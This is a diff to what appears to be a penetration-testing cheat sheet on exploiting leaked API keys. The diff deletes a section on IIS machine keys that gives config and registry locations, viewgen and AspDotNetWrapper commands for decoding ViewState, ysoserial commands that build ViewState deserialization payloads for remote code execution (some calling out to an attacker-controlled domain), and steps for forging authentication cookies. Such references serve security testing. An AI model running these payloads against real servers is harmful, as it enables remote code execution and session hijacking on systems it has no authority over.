@@ -16,7 +16,6 @@
     - [Twitter Bearer Token](#twitter-bearer-token)
     - [Gitlab Personal Access Token](#gitlab-personal-access-token)
     - [HockeyApp API Token](#hockeyapp-api-token)
-    - [IIS Machine Keys](#iis-machine-keys)
     - [Mapbox API Token](#Mapbox-API-Token)
 
 
@@ -142,88 +141,6 @@ curl -H "X-HockeyAppToken: ad136912c642076b0d1f32ba161f1846b2c" https://rink.hoc
 ```
 
 
-### IIS Machine Keys
-
-> That machine key is used for encryption and decryption of forms authentication cookie data and view-state data, and for verification of out-of-process session state identification.
-
-Requirements
-* machineKey **validationKey** and **decryptionKey**
-* __VIEWSTATEGENERATOR cookies
-* __VIEWSTATE cookies
-
-Example of a machineKey from https://docs.microsoft.com/en-us/iis/troubleshoot/security-issues/troubleshooting-forms-authentication.
-
-```xml
-<machineKey validationKey="87AC8F432C8DB844A4EFD024301AC1AB5808BEE9D1870689B63794D33EE3B55CDB315BB480721A107187561F388C6BEF5B623BF31E2E725FC3F3F71A32BA5DFC" decryptionKey="E001A307CCC8B1ADEA2C55B1246CDCFE8579576997FF92E7" validation="SHA1" />
-```
-
-Common locations of **web.config** / **machine.config**
-* 32-bit
-    * C:\Windows\Microsoft.NET\Framework\v2.0.50727\config\machine.config
-    * C:\Windows\Microsoft.NET\Framework\v4.0.30319\config\machine.config
-* 64-bit
-    * C:\Windows\Microsoft.NET\Framework64\v4.0.30319\config\machine.config
-    * C:\Windows\Microsoft.NET\Framework64\v2.0.50727\config\machine.config
-* in registry when **AutoGenerate** is enabled (extract with https://gist.github.com/irsdl/36e78f62b98f879ba36f72ce4fda73ab)
-    * HKEY_CURRENT_USER\Software\Microsoft\ASP.NET\4.0.30319.0\AutoGenKeyV4  
-    * HKEY_CURRENT_USER\Software\Microsoft\ASP.NET\2.0.50727.0\AutoGenKey
-
-
-#### Identify known machine key
-
-* Exploit with [Blacklist3r/AspDotNetWrapper](https://github.com/NotSoSecure/Blacklist3r)
-* Exploit with [ViewGen](https://github.com/0xacb/viewgen)
-
-```powershell
-# --webconfig WEBCONFIG: automatically load keys and algorithms from a web.config file
-# -m MODIFIER, --modifier MODIFIER: VIEWSTATEGENERATOR value
-$ viewgen --guess "/wEPDwUKMTYyODkyNTEzMw9kFgICAw8WAh4HZW5jdHlwZQUTbXVsdGlwYXJ0L2Zvcm0tZGF0YWRkuVmqYhhtcnJl6Nfet5ERqNHMADI="
-[+] ViewState is not encrypted
-[+] Signature algorithm: SHA1
-
-# --encrypteddata : __VIEWSTATE parameter value of the target application
-# --modifier : __VIEWSTATEGENERATOR parameter value
-$ AspDotNetWrapper.exe --keypath MachineKeys.txt --encrypteddata <real viewstate value> --purpose=viewstate --modifier=<modifier value> –macdecode
-```
-
-#### Decode ViewState
-
-```powershell
-$ viewgen --decode --check --webconfig web.config --modifier CA0B0334 "zUylqfbpWnWHwPqet3cH5Prypl94LtUPcoC7ujm9JJdLm8V7Ng4tlnGPEWUXly+CDxBWmtOit2HY314LI8ypNOJuaLdRfxUK7mGsgLDvZsMg/MXN31lcDsiAnPTYUYYcdEH27rT6taXzDWupmQjAjraDueY="
-
-$ .\AspDotNetWrapper.exe --keypath MachineKeys.txt --encrypteddata /wEPDwUKLTkyMTY0MDUxMg9kFgICAw8WAh4HZW5jdHlwZQUTbXVsdGlwYXJ0L2Zvcm0tZGF0YWRkbdrqZ4p5EfFa9GPqKfSQRGANwLs= --decrypt --purpose=viewstate  --modifier=CA0B0334 --macdecode
-
-$ .\AspDotNetWrapper.exe --keypath MachineKeys.txt --encrypteddata /wEPDwUKLTkyMTY0MDUxMg9kFgICAw8WAh4HZW5jdHlwZQUTbXVsdGlwYXJ0L2Zvcm0tZGF0YWRkbdrqZ4p5EfFa9GPqKfSQRGANwLs= --decrypt --purpose=viewstate --modifier=6811C9FF --macdecode --TargetPagePath "/Savings-and-Investments/Application/ContactDetails.aspx" -f out.txt --IISDirPath="/"
-```
-
-
-#### Generate ViewState for RCE
-
-**NOTE**: Send a POST request with the generated ViewState to the same endpoint, in Burp you should **URL Encode Key Characters** for your payload.
-
-```powershell
-$ ysoserial.exe -p ViewState  -g TextFormattingRunProperties -c "cmd.exe /c nslookup <your collab domain>"  --decryptionalg="AES" --generator=ABABABAB decryptionkey="<decryption key>"  --validationalg="SHA1" --validationkey="<validation key>"
-$ ysoserial.exe -p ViewState -g TypeConfuseDelegate -c "echo 123 > c:\pwn.txt" --generator="CA0B0334" --validationalg="MD5" --validationkey="b07b0f97365416288cf0247cffdf135d25f6be87"
-$ ysoserial.exe -p ViewState -g ActivitySurrogateSelectorFromFile -c "C:\Users\zhu\Desktop\ExploitClass.cs;C:\Windows\Microsoft.NET\Framework64\v4.0.30319\System.dll;C:\Windows\Microsoft.NET\Framework64\v4.0.30319\System.Web.dll" --generator="CA0B0334" --validationalg="SHA1" --validationkey="b07b0f97365416288cf0247cffdf135d25f6be87"
-
-$ viewgen --webconfig web.config -m CA0B0334 -c "ping yourdomain.tld"
-```
-
-
-#### Edit cookies with the machine key
-
-If you have the machineKey but the viewstate is disabled.
-
-ASP.net Forms Authentication Cookies : https://github.com/liquidsec/aspnetCryptTools
-
-```powershell
-# decrypt cookie
-$ AspDotNetWrapper.exe --keypath C:\MachineKey.txt --cookie XXXXXXX_XXXXX-XXXXX --decrypt --purpose=owin.cookie --valalgo=hmacsha512 --decalgo=aes
-
-# encrypt cookie (edit Decrypted.txt)
-$ AspDotNetWrapper.exe --decryptDataFilePath C:\DecryptedText.txt
-```
-
 ### Mapbox API Token
 
 A Mapbox API Token is a JSON Web Token (JWT). If the header of the JWT is `sk`, jackpot. If it's `pk` or `tk`, it's not worth your time.
@@ -236,7 +153,6 @@ A Mapbox API Token is a JSON Web Token (JWT). If the header of the JWT is `sk`, 
 
 * [Finding Hidden API Keys & How to use them - Sumit Jain - August 24, 2019](https://medium.com/@sumitcfe/finding-hidden-api-keys-how-to-use-them-11b1e5d0f01d)
 * [Private API key leakage due to lack of access control - yox - August 8, 2018](https://hackerone.com/reports/376060)
-* [Project Blacklist3r - November 23, 2018 - @notsosecure](https://www.notsosecure.com/project-blacklist3r/)
 * [Saying Goodbye to my Favorite 5 Minute P1 - Allyson O'Malley - January 6, 2020](https://www.allysonomalley.com/2020/01/06/saying-goodbye-to-my-favorite-5-minute-p1/)
 * [Mapbox API Token Documentation](https://docs.mapbox.com/help/troubleshooting/how-to-use-mapbox-securely/)
 * [Introducing SignSaboteur: forge signed web tokens with ease - Zakhar Fedotkin - 22 May 2024](https://portswigger.net/research/introducing-signsaboteur-forge-signed-web-tokens-with-ease)
